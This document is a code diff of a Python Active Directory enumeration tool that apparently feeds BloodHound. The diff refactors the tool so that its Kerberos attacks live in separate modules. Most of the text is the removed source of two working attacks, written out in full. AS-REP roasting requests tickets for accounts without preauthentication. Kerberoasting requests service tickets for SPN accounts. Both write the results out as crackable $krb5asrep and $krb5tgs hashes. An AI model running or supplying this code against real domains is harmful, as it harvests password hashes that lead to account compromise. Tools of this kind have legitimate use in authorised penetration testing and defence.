@@ -11,27 +11,9 @@ import contextlib, argparse, textwrap, errno, sys, socket, json, re, os, base64
 
 from dns.resolver import NXDOMAIN
 
-# Thanks SecureAuthCorp for GetNPUsers.py
-# For Kerberos preauthentication
-from impacket.krb5 import constants
-from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
-from impacket.krb5.kerberosv5 import sendReceive, KerberosError
-from impacket.krb5.types import KerberosTime, Principal
-from pyasn1.codec.der import decoder, encoder
-from pyasn1.type.univ import noValue
-from binascii import hexlify
-import datetime, random
-
-# Thanks SecureAuthCorp for GetUserSPNs.py
-# For SPN enum
-from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-from impacket.ntlm import compute_lmhash, compute_nthash
-from impacket.krb5.asn1 import TGS_REP
-
-from . bloodhound import BloodHound, resolve_collection_methods
-from . bloodhound.ad.domain import AD
-from . bloodhound.ad.authentication import ADAuthentication
+from .bloodhound import BloodHound, resolve_collection_methods
+from .bloodhound.ad.domain import AD
+from .bloodhound.ad.authentication import ADAuthentication
 
 
 class EnumAD():
@@ -95,10 +77,12 @@ class EnumAD():
             self.outputToBloodhoundJson()
     
         if self.kpre:
-            self.enumKerbPre()
+            from . attack.ASREPRoasting import ASREPRoasting
+            asrep = ASREPRoasting(self.dc_string, self.server, self.conn)
     
         if self.spnEnum:
-            self.enumSPNUsers()
+            from . attack.kerberoasting import Kerberoasting
+            kerb = Kerberoasting(self.server, self.domuser, self.passwd, self.spn)
         
         self.conn.unbind()
         
@@ -296,14 +280,6 @@ class EnumAD():
 
         print('[ ' + colored('OK', 'green') +' ] Wrote hosts with oldest OS to {0}-oldest-OS'.format(self.server))
     
-
-    def splitJsonArr(self, arr):
-        if isinstance(arr, list):
-            if len(arr) == 1:
-                return arr[0]
-        return arr
-
-
     def outputToBloodhoundJson(self):
         
         print('[ ' + colored('OK', 'green') +' ] Generating BloodHound output - this may take time...')
@@ -335,9 +311,6 @@ class EnumAD():
         except Exception as e:
             print(e)
             print('[ ' + colored('ERROR', 'red') +' ] Generating BloodHound output failed')
-
-
-
 
 
     def write_file(self):
@@ -375,159 +348,6 @@ class EnumAD():
                 f.write("\n")
 
         print('[ ' + colored('OK', 'green') +' ] Wrote all files to {0}-obj_name'.format(self.output))
-
-
-    def enumKerbPre(self):
-        # Build user array
-        users = []
-        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=self.ldapProps, search_scope=SUBTREE)
-        for entry in self.conn.entries:
-            users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.server))
-        if len(users) == 0:
-            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
-        elif len(users) == 1:
-            print('[ ' + colored('OK', 'yellow') +' ] Found {0} account that does not require Kerberos preauthentication'.format(len(users)))
-        else:
-            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
-    
-        hashes = []
-        # Build request for Tickets
-        for usr in users:
-            clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            asReq = AS_REQ()
-            domain = str(self.server).upper()
-            serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            pacReq = KERB_PA_PAC_REQUEST()
-            pacReq['include-pac'] = True
-            encodedPacReq = encoder.encode(pacReq)
-            asReq['pvno'] = 5
-            asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
-            asReq['padata'] = noValue
-            asReq['padata'][0] = noValue
-            asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
-            asReq['padata'][0]['padata-value'] = encodedPacReq
-
-            requestBody = seq_set(asReq, 'req-body')
-
-            options = list()
-            options.append(constants.KDCOptions.forwardable.value)
-            options.append(constants.KDCOptions.renewable.value)
-            options.append(constants.KDCOptions.proxiable.value)
-            requestBody['kdc-options'] = constants.encodeFlags(options)
-
-            seq_set(requestBody, 'sname', serverName.components_to_asn1)
-            seq_set(requestBody, 'cname', clientName.components_to_asn1)
-
-            requestBody['realm'] = domain
-
-            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
-            requestBody['till'] = KerberosTime.to_asn1(now)
-            requestBody['rtime'] = KerberosTime.to_asn1(now)
-            requestBody['nonce'] = random.getrandbits(31)
-
-            supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
-
-            seq_set_iter(requestBody, 'etype', supportedCiphers)
-
-            msg = encoder.encode(asReq)
-
-            try:
-                response = sendReceive(msg, domain, self.server)
-            except KerberosError as e:
-                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                    supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
-                    seq_set_iter(requestBody, 'etype', supportedCiphers)
-                    msg = encoder.encode(asReq)
-                    response = sendReceive(msg, domain, self.server)
-                else:
-                    print(e)
-                    continue
-
-            asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
-
-            hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
-
-        if len(hashes) > 0:
-            with open('{0}-jtr-hashes'.format(self.server), 'w') as f:
-                for h in hashes:
-                    f.write(str(h) + '\n')
-
-            print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.server))
-        else:
-            print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')
-
-
-    def enumSPNUsers(self):
-        users_spn = {
-        }
-        user_tickets = {
-        }
-
-        userDomain = self.domuser.split('@')[1]
-
-        idx = 0
-        for entry in self.spn:
-            spn = json.loads(self.spn[idx].entry_to_json())
-            users_spn[self.splitJsonArr(spn['attributes'].get('name'))] = self.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
-            idx += 1    
-
-        # Get TGT for the supplied user
-        client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        try:
-            # We need to take the domain from the user@domain since it *could* be a cross-domain user
-            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=None)
-
-            TGT = {}
-            TGT['KDC_REP'] = tgt
-            TGT['cipher'] = cipher
-            TGT['sessionKey'] = newSession
-    
-            for user, spns in users_spn.items():
-                if isinstance(spns, list):
-                    # We only really need one to get a ticket
-                    spn = spns[0]
-                else:
-                    spn = spns
-                    try:
-                        # Get the TGS
-                        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                        tgs, cipher, oldSession, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
-                        # Decode the TGS
-                        decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-                        # Get different encryption types
-                        if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
-                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-                            user_tickets[spn] = entry
-                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
-                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
-                            user_tickets[spn] = entry
-                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
-                            user_tickets[spn] = entry
-                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
-                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-                            user_tickets[spn] = entry
-
-                    except KerberosError:
-                        # For now continue
-                        # TODO: Maybe look deeper into issue here
-                        continue
-
-            if len(user_tickets.keys()) > 0:
-                with open('{0}-spn-tickets'.format(self.server), 'w') as f:
-                    for key, value in user_tickets.items():
-                        f.write('{0}:{1}\n'.format(key, value))
-                if len(user_tickets.keys()) == 1:
-                    print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting'.format(len(user_tickets.keys())))
-                else:
-                    print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
-            else:
-                print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
-
-
-        except KerberosError as err:
-            print('[ ' + colored('ERROR', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
-            pass
 
 
     def enumForCreds(self, ldapdump):
